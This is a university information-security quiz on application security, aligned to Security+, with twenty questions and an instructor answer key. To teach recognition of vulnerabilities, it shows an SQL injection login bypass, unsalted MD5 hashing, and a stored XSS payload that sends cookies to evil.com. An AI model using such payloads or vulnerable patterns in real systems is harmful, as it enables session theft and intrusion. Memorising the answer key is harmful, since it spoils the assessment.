# Quiz: Module 10 — Application Security

## Course: CIS-4328 Information Security

**Certification Alignment:** CompTIA Security+ (SY0-701)

---

## Instructions

This quiz contains 20 questions aligned to Security+ SY0-701 exam objectives. Questions use the same format as the actual exam. Time limit: 30 minutes. Each question is worth 5 points. A score of 75 or higher (15/20) is required to pass.

---

## Questions

**Question 1**

A developer writes the following Python code to authenticate users:

```python
query = "SELECT * FROM users WHERE user='" + username + "' AND pass='" + password + "'"
```

A user enters the username `admin' --` and any password. The user is authenticated as admin. What is the root cause of this vulnerability?

- A. The application uses HTTPS instead of HTTP
- B. User-supplied input is concatenated into a SQL query without parameterization
- C. The application does not enforce password complexity requirements
- D. The application fails to implement MFA for admin accounts

---

**Question 2**

Which of the following is the MOST effective defense against SQL injection?

- A. Input validation that blocks single quote characters
- B. A web application firewall configured with SQL injection rules
- C. Parameterized queries (prepared statements)
- D. Database connection encryption using TLS

---

**Question 3**

A web application reflects a user's search query back in the HTML page without encoding it. An attacker crafts a URL with a malicious script payload and sends it to a victim. When the victim clicks the link, the script executes in their browser. What type of attack is this?

- A. Stored XSS
- B. Reflected XSS
- C. DOM-based XSS
- D. CSRF (Cross-Site Request Forgery)

---

**Question 4**

A content management system stores user-submitted blog post comments in a database and displays them to all visitors without sanitization. An attacker submits a comment containing `<script>document.location='https://evil.com/?c='+document.cookie</script>`. Every visitor who views the post has their session cookie stolen. What type of attack is this?

- A. Reflected XSS
- B. Stored XSS
- C. SQL injection
- D. CSRF

---

**Question 5**

A security engineer adds the following HTTP response header to the application:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

What does this header accomplish?

- A. It forces all connections to use HTTPS
- B. It prevents the browser from executing scripts loaded from external domains
- C. It prevents SQL injection attacks by blocking special characters
- D. It encrypts the session cookie

---

**Question 6**

A user profile page at `https://app.example.com/profile?id=1042` allows the authenticated user to view their profile. By changing the `id` parameter to `1043`, the user can view another user's profile. What vulnerability is present?

- A. SQL injection
- B. Reflected XSS
- C. Insecure Direct Object Reference (IDOR)
- D. Session fixation

---

**Question 7**

A security architect is reviewing a login form. The form displays the error message "No account found for that email address" when an unregistered email is submitted. What STRIDE threat category does this behavior exemplify?

- A. Spoofing
- B. Tampering
- C. Information Disclosure
- D. Elevation of Privilege

---

**Question 8**

During a threat modeling session, the team identifies that an attacker could modify a payment amount in transit between the user's browser and the payment API. Which STRIDE category describes this threat?

- A. Spoofing
- B. Tampering
- C. Repudiation
- D. Denial of Service

---

**Question 9**

An organization wants to scan application source code for security vulnerabilities during every pull request before code is merged. Which tool category is MOST appropriate?

- A. DAST
- B. SAST
- C. IAST
- D. Network vulnerability scanner

---

**Question 10**

A SAST scan reports 450 findings across a large codebase. The development team complains that 80% of the findings are in code paths that are never actually executed or receive user input. What SAST limitation does this illustrate?

- A. SAST cannot analyze compiled code
- B. SAST requires application execution to find runtime vulnerabilities
- C. SAST has a high false positive rate due to lack of runtime context
- D. SAST tools cannot scan JavaScript or Python code

---

**Question 11**

A security team wants to identify vulnerabilities in a running web application's authentication mechanism, including missing security headers and session token weaknesses, without access to the source code. Which tool type is MOST appropriate?

- A. SAST
- B. SCA
- C. DAST
- D. IAST

---

**Question 12**

A developer discovers that the `log4j` library in their Java application is affected by the Log4Shell vulnerability (CVE-2021-44228). Which tool category would have detected this vulnerable library before deployment?

- A. DAST
- B. SCA (Software Composition Analysis)
- C. SAST
- D. IAST

---

**Question 13**

A security policy requires that passwords be stored in a way that is computationally expensive to reverse. Which algorithm is MOST appropriate for storing user passwords?

- A. SHA-256 with salt
- B. MD5
- C. AES-256
- D. bcrypt with a cost factor of 12

---

**Question 14**

A developer stores a database connection string including the password in a file named `config.py` that is committed to the public GitHub repository. Which secure coding principle was violated?

- A. Least privilege
- B. Defense in depth
- C. No hardcoded secrets in source code
- D. Fail secure error handling

---

**Question 15**

A web application's error handler catches all exceptions and returns a detailed stack trace to the browser including database table names and SQL queries. Which STRIDE threat does this behavior facilitate?

- A. Spoofing
- B. Tampering
- C. Information Disclosure
- D. Denial of Service

---

**Question 16**

Which secure coding principle states that an application component should only have the access rights necessary to perform its specific function?

- A. Defense in depth
- B. Fail secure
- C. Least privilege
- D. Separation of duties

---

**Question 17**

A developer validates user input on the front end using JavaScript before the form is submitted. The developer argues this is sufficient input validation. Why is this argument incorrect?

- A. JavaScript validation is slower than server-side validation
- B. An attacker can bypass client-side JavaScript validation by directly crafting and sending HTTP requests
- C. JavaScript cannot validate email address formats
- D. Front-end validation is only valid for GET requests, not POST requests

---

**Question 18**

A security team applies the principle of "shift left" to their development process. What does this mean in practice?

- A. Security teams should shift their focus to left-to-right reading of code
- B. Security testing and validation activities are moved earlier in the development lifecycle
- C. Security personnel should physically move to sit with the development team
- D. Security controls should be applied at the network perimeter rather than the application layer

---

**Question 19**

An application uses the following password storage approach: `hash = MD5(password)`. A breach exposes the hashed passwords. An attacker uses a rainbow table and cracks 90% of passwords within 24 hours. What TWO improvements would prevent this attack? (Select TWO)

- A. Use bcrypt instead of MD5
- B. Add a unique per-user salt before hashing
- C. Store the hash in a separate database table
- D. Encrypt the MD5 hash with AES-256
- E. Require users to reset passwords every 30 days

---

**Question 20**

A development team uses an automated pipeline where SAST runs at code commit, SCA runs at build time, and DAST runs against the staging environment. A critical SQL injection vulnerability is discovered by DAST in staging. What does this finding indicate about the SAST configuration?

- A. SAST is not needed if DAST catches the same vulnerability
- B. SAST may be misconfigured, missing the SQL injection rule, or the finding is a false negative
- C. SAST tools cannot detect SQL injection vulnerabilities
- D. The vulnerability was introduced after the SAST scan completed

---

## Answer Key

*For instructor use only — do not distribute to students*

| Question | Answer | Objective |
|---|---|---|
| 1 | B | 1.3 — SQL injection root cause |
| 2 | C | 1.3 — SQL injection defense |
| 3 | B | 1.3 — Reflected XSS |
| 4 | B | 1.3 — Stored XSS |
| 5 | B | 2.4 — CSP header |
| 6 | C | 1.3 — IDOR / A01 |
| 7 | C | 2.4 — STRIDE information disclosure |
| 8 | B | 2.4 — STRIDE tampering |
| 9 | B | 2.6 — SAST integration |
| 10 | C | 2.6 — SAST false positives |
| 11 | C | 2.6 — DAST use case |
| 12 | B | 2.6 — SCA |
| 13 | D | 2.3 — Password hashing |
| 14 | C | 2.4 — Secrets management |
| 15 | C | 2.4 — STRIDE / error handling |
| 16 | C | 2.3 — Least privilege |
| 17 | B | 1.3 — Client-side validation bypass |
| 18 | B | 2.4 — Shift left |
| 19 | A, B | 2.3 — Password storage |
| 20 | B | 2.6 — SAST false negative |

---

*Texas Wesleyan University | CIS-4328 Information Security | Module 10*
